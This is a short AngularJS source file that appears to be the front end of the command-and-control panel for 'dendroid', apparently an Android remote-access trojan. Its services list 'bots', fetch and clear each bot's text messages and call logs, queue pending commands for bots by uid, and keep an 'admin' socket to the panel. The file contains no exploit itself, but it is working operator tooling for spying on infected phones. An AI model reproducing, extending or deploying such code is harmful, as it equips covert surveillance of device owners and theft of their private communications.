App.service('BotService', ['$http', function($http) {

  this.fetch = function() {
    return $http.get('/bots');
  }

  this.get = function(id) {
    return $http.get('/bots/' + id)
  }

}])

.service('MessageService', [
  '$http',
  function($http) {
    this.fetch = function(uid) {
      return $http.get('/get-messages/' + uid)
    }

    this.clear = function(uid) {
      return $http.delete('/clear-messages/' + uid)
    }
  }
])

.service('CallLogService', [
  '$http',
  function($http) {
    this.fetch = function(uid) {
      return $http.get('/call-logs/' + uid)
    }

    this.clear = function(uid) {
      return $http.delete('/call-logs/' + uid)
    }
  }
])

.service('CommandService', [
  '$http',
  function($http) {
    this.add = function(cmd) {
      return $http.post('/add-command', cmd);
    }

    this.getPending = function(uid) {
      return $http.get('/pending-commands?uid=' + uid)
    }

    this.delete = function(id) {
      return $http.delete('/commands/' + id)
    }
  }
])

.factory('dendroidSocket', [
  'socketFactory',
  '$timeout',
  'toastr',
  '$http',
  function(socketFactory, $timeout, toastr, $http) {
    var reconnectTime = 5; //s
    var socket = socketFactory();

    socket.on('test', function(msg) {
      console.log(msg)
    })

    function reconnect() {
      toastr.warning('Disconnected. Reconnecting in 5 seconds...', 'Disconnected');
      $timeout(function() {
        $http.get('/').then(function() {
          socket.connect();
        }).catch(function() {
          toastr.clear();
          reconnect();
        });
      }, reconnectTime * 1000);
    }

    socket.on('disconnect', reconnect)
    socket.on('connect', function() {

      socket.emit('admin')
      toastr.clear();
      toastr.success('Panel is connected', 'Info')
    });
    return socket;
  }
]);
